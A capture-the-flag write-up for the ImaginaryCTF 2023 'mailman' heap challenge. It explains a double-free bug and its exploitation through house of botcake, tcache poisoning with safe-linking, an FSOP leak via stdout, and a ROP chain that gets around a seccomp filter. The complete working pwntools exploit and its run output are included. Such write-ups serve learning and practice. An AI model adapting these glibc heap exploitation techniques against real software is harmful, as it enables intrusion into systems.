# mailman

>mailman (423 pts) - 31 solves by Eth007
>
>Description
>
>I'm sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...
>Flag is in ./flag.txt.
>
>Attachments
>https://imaginaryctf.org/r/PIxtO#vuln https://imaginaryctf.org/r/c9Mk8#libc.so.6 
>
>nc mailman.chal.imaginaryctf.org 1337

mailman is a heap challenge I did for the [ImaginaryCTF 2023](https://2023.imaginaryctf.org) event. It was a basic heap challenge involving tcache poisoning, safe-linking and seccomp bypass. You can find the related files [there](https://github.com/ret2school/ctf/tree/master/2023/imaginaryctf/pwn/mailman).

## TL;DR

- Trivial heap and libc leak
- tcache poisoning to hiijack stdout
- FSOP on stdout to leak environ
- tcache poisoning on the fgets's stackframe
- ROPchain that takes care of the seccomp
- PROFIT

## Code review

First let's take at the version of the libc and at the protections inabled onto the binary.
```
$ checksec --file vuln 
[*] '/home/alexis/Documents/pwn/ImaginaryCTF/mailman/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ checksec --file libc.so.6 
[*] '/home/alexis/Documents/pwn/ImaginaryCTF/mailman/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

Full prot for the binary and classic partial RELRO for the already up-to-date libc. The binary loads a seccomp that allows only the read, write, open, fstat and exit system calls.

By reading the code in IDA the main looks like this:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rax
  int v4; // [rsp+Ch] [rbp-24h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  __int64 v6; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v6 = seccomp_init(0LL, argv, envp);
  seccomp_rule_add(v6, 2147418112LL, 2LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 0LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 1LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 5LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 60LL, 0LL);
  seccomp_load(v6);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("Welcome to the post office.");
  puts("Enter your choice below:");
  puts("1. Write a letter");
  puts("2. Send a letter");
  puts("3. Read a letter");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      __isoc99_scanf("%d%*c", &v4);
      if ( v4 != 3 )
        break;
      v7 = inidx();
      puts(*((const char **)&mem + v7));
    }
    if ( v4 > 3 )
      break;
    if ( v4 == 1 )
    {
      v7 = inidx();
      printf("letter size: ");
      __isoc99_scanf("%lu%*c", &size);
      v3 = malloc(size);
      *((_QWORD *)&mem + v7) = v3;
      printf("content: ");
      fgets(*((char **)&mem + v7), size, stdin);
    }
    else
    {
      if ( v4 != 2 )
        break;
      v7 = inidx();
      free(*((void **)&mem + v7));
    }
  }
  puts("Invalid choice!");
  _exit(0);
}
```

The program allows to create a chunk of any size, filling it with user-supplied input with fgets. We can print its content or free it. The bug lies in the free handler that doesn't check if a chunk has already been free'd.

# Exploitation

Before bypassing the seccomp we need to get code execution, to do so I will use the very classic exploitation flow: `FSOP stdout to leak environ` => `ROPchain`. I could have used an [angry FSOP](https://blog.kylebot.net/2022/10/22/angry-FSROP/) to directly get code execution by hijjacking the vtable used by the wide operations in stdout, given actually it is not checked against a specific address range as it is the case for the `_vtable`. To get code execution, we need to get the heap and libc base addresses.

## Heap and libc leak

To get a heap leak we can simply do defeat safe-linking:
```py
# leak

free(0)
view(0)

heap = ((pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12) - 0x2000)
pwn.log.info(f"heap @ {hex(heap)}")
```

To get an arbitrary read / write I used the house of botcake technique. I already talked about it more deeply [there](https://nasm.re/posts/catastrophe/#house-of-botcake). During this house I put a chunk in the unsortedbin, leaking the libc:
```py
add(0, 0x100, b"YY")

add(7, 0x100, b"YY") # prev
add(8, 0x100, b"YY") # a

# fill tcache
for i in range(7):
    free(i)

for _ in range(20):
    add(9, 0x10, b"/bin/sh\0") # barrier

free(8) # free(a) => unsortedbin
free(7) # free(prev) => merged with a

# leak libc
view(8)

libc.address = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x219ce0 # offset of the unsorted bin
pwn.log.success(f"libc: {hex(libc.address)}")
```

## House of botcake for the win

The house of botcake is very easy to understand, it is useful when you can trigger some double free bug. It is basically:

- Allocate 7 0x100 sized chunks to then fill the tcache (7 entries).
- Allocate two more 0x100 sized chunks (prev and a in the example).
- Allocate a small “barrier” 0x10 sized chunk.
- Fill the tcache by freeing the first 7 chunks.
- free(a), thus a falls into the unsortedbin.
- free(prev), thus prev is consolidated with a to create a large 0x221 sized chunk that is remains in the unsortedbin.
- Request one more 0x100 sized chunk to let a single entry available in the tcache.
- free(a) again, given a is part of the large 0x221 sized chunk it leads to an UAF. Thus a falls into the tcache.
- That’s finished, to get a write what where we just need to request a 0x130 sized chunk. Thus we can hiijack the next fp of a that is currently referenced by the tcache by the location we wanna write to. And next time two 0x100 sized chunks are requested, the second one will be the target location.

Which gives:
```py
for i in range(7):
    add(i, 0x100, b"")

# leak

free(0)
view(0)

heap = ((pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12) - 0x2000)
pwn.log.info(f"heap @ {hex(heap)}")

add(0, 0x100, b"YY")

add(7, 0x100, b"YY") # prev
add(8, 0x100, b"YY") # a

# fill tcache
for i in range(7):
    free(i)

for _ in range(20):
    add(9, 0x10, b"/bin/sh\0") # barrier

free(8) # free(a) => unsortedbin
free(7) # free(prev) => merged with a

# leak libc
view(8)

libc.address = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x219ce0 # offset of the unsorted bin
pwn.log.success(f"libc: {hex(libc.address)}")

stdout = libc.address + 0x21a780
environ = libc.address + 0x2a72d0 + 8
strr = libc.address + 0x1bd460

pwn.log.success(f"environ: {hex(environ)}")
pwn.log.success(f"stdout: {hex(stdout)}")

add(0, 0x100, b"YY") # pop a chunk from the tcache to let an entry left to a 
free(8) # free(a) => tcache

# unsortedbin => oob on a => tcache poisoning
add(1, 0x130, b"T"*0x108 + pwn.p64(0x111) + pwn.p64(((stdout) ^ ((heap + 0x2b90) >> 12))))
add(2, 0x100, b"TT")

# tcache => stdout
```

Then, at the next `0x100` request `stdout` will be returned! Something important to notice if you're a beginner in heap exploitation is how the safe-linking is handled, you have to xor the target location with `((chunk_location) >> 12))`. Sometimes the result is not properly aligned leading to a crash, to avoid this you can add or sub 0x8 to your target location.

## FSOP on stdout

To leak the address of the stack we can use a FSOP on stdout. To understand how a such attack does work I advice you to read my [this write-up](https://ret2school.github.io/post/catastrophe/). The goal is to read the stack address stored at `libc.sym.environ` within the libc. Which gives:

```py
# tcache => stdout
add(3, 0x100, pwn.flat(0xfbad1800, # _flags
                        libc.sym.environ, # _IO_read_ptr
                        libc.sym.environ, # _IO_read_end
                        libc.sym.environ, # _IO_read_base
                        libc.sym.environ, # _IO_write_base
                        libc.sym.environ + 0x8, # _IO_write_ptr
                        libc.sym.environ + 0x8, # _IO_write_end
                        libc.sym.environ + 0x8, # _IO_buf_base
                        libc.sym.environ + 8 # _IO_buf_end
                        )
    )

stack = pwn.u64(io.recv(8)[:-1].ljust(8, b"\x00")) - 0x160 # stackframe of fgets
pwn.log.info(f"stack: {hex(stack)}")
```

# PROFIT

Now we leaked everything we just need to reuse the arbitrary write provided thanks to the house of botcake, given we already have overlapping chunks, to get another arbitrary write we just need to put the large chunk in a large tcache and the overlapped chunk in the `0x100` tcache, then we just have to corrupt `victim->fp` to the saved rip of the `fgets` stackframe :). It gives:

```py
rop = pwn.ROP(libc, base=stack)

# ROPchain
rop(rax=pwn.constants.SYS_open, rdi=stack + 0xde + 2 - 0x18, rsi=pwn.constants.O_RDONLY) # open
rop.call(rop.find_gadget(["syscall", "ret"]))
rop(rax=pwn.constants.SYS_read, rdi=3, rsi=(stack & ~0xfff), rdx=0x300) # file descriptor bf ...
rop.call(rop.find_gadget(["syscall", "ret"]))

rop(rax=pwn.constants.SYS_write, rdi=1, rsi=(stack & ~0xfff), rdx=0x50) # write
rop.call(rop.find_gadget(["syscall", "ret"]))
rop.raw("./flag.txt\x00")

# victim => tcache
free(8) 

# prev => tcache 0x140
free(7) 

# tcache poisoning
add(5, 0x130, b"T"*0x100 + pwn.p64(0) + pwn.p64(0x111) + pwn.p64(((stack - 0x28) ^ ((heap + 0x2b90) >> 12))))
add(2, 0x100, b"TT") # dumb

print(rop.dump())
add(3, 0x100, pwn.p64(0x1337)*5 + rop.chain())

io.interactive()
```

Which gives:
```
$ python3 exploit.py REMOTE HOST=mailman.chal.imaginaryctf.org PORT=1337
[*] '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mailman.chal.imaginaryctf.org on port 1337: Done
[*] heap @ 0x5611bbf93000
[+] libc: 0x7f6b49fec000
[+] environ: 0x7f6b4a2932d8
[+] stdout: 0x7f6b4a206780
[*] stack: 0x7fff28533ba8
[*] Loaded 218 cached gadgets for '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/libc.so.6'
[*] Switching to interactive mode
ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
```

# Annexes

Final exploit:
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "vuln"
LIBC = "/home/alexis/Documents/pwn/ImaginaryCTF/mailman/libc.so.6"
LD = "/home/alexis/Documents/pwn/ImaginaryCTF/mailman/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
pwn.context.timeout = 3
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source ~/Downloads/pwndbg/gdbinit.py
b* main
'''.format(**locals())

def exp():
    io = start()

    def add(idx, size, data, noLine=False):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"idx: ", str(idx).encode())
        io.sendlineafter(b"size: ", str(size).encode())
        
        if not noLine:
            io.sendlineafter(b"content: ", data)
        else:
            io.sendafter(b"content: ", data)

    def view(idx):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"idx: ", str(idx).encode())

    def free(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"idx: ", str(idx).encode())

    for i in range(7):
        add(i, 0x100, b"")

    # leak

    free(0)
    view(0)

    heap = ((pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12) - 0x2000)
    pwn.log.info(f"heap @ {hex(heap)}")

    add(0, 0x100, b"YY")

    add(7, 0x100, b"YY") # prev
    add(8, 0x100, b"YY") # a

    # fill tcache
    for i in range(7):
        free(i)

    for _ in range(20):
        add(9, 0x10, b"/bin/sh\0") # barrier

    free(8) # free(a) => unsortedbin
    free(7) # free(prev) => merged with a

    # leak libc
    view(8)

    libc.address = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x219ce0 # offset of the unsorted bin
    pwn.log.success(f"libc: {hex(libc.address)}")

    stdout = libc.address + 0x21a780
    environ = libc.address + 0x2a72d0 + 8
    strr = libc.address + 0x1bd460

    pwn.log.success(f"environ: {hex(environ)}")
    pwn.log.success(f"stdout: {hex(stdout)}")

    add(0, 0x100, b"YY") # pop a chunk from the tcache to let an entry left to a 
    free(8) # free(a) => tcache

    # unsortedbin => oob on a => tcache poisoning
    add(
        1, 0x130, pwn.flat(
                            b"T"*0x108 + pwn.p64(0x111),
                           (stdout) ^ ((heap + 0x2b90) >> 12)
                           )
        )
    add(2, 0x100, b"TT")

    # tcache => stdout
    add(3, 0x100, pwn.flat(0xfbad1800, # _flags
                           libc.sym.environ, # _IO_read_ptr
                           libc.sym.environ, # _IO_read_end
                           libc.sym.environ, # _IO_read_base
                           libc.sym.environ, # _IO_write_base
                           libc.sym.environ + 0x8, # _IO_write_ptr
                           libc.sym.environ + 0x8, # _IO_write_end
                           libc.sym.environ + 0x8, # _IO_buf_base
                           libc.sym.environ + 8 # _IO_buf_end
                           )
        )

    stack = pwn.u64(io.recv(8)[:-1].ljust(8, b"\x00")) - 0x160 # stackframe of fgets
    pwn.log.info(f"stack: {hex(stack)}")

    rop = pwn.ROP(libc, base=stack)

    # ROPchain
    rop(rax=pwn.constants.SYS_open, rdi=stack + 0xde + 2 - 0x18, rsi=pwn.constants.O_RDONLY) # open
    rop.call(rop.find_gadget(["syscall", "ret"]))
    rop(rax=pwn.constants.SYS_read, rdi=3, rsi=(stack & ~0xfff), rdx=0x300) # file descriptor bf ...
    rop.call(rop.find_gadget(["syscall", "ret"]))

    rop(rax=pwn.constants.SYS_write, rdi=1, rsi=(stack & ~0xfff), rdx=0x50) # write
    rop.call(rop.find_gadget(["syscall", "ret"]))
    rop.raw("./flag.txt\x00")

    # victim => tcache
    free(8) 
    
    # prev => tcache 0x140
    free(7) 

    # tcache poisoning
    add(5, 0x130, b"T"*0x100 + pwn.p64(0) + pwn.p64(0x111) + pwn.p64(((stack - 0x28) ^ ((heap + 0x2b90) >> 12))))
    add(2, 0x100, b"TT") # dumb

    print(rop.dump())
    add(3, 0x100, pwn.p64(0x1337)*5 + rop.chain())

    io.interactive()

if __name__ == "__main__":
    exp()
```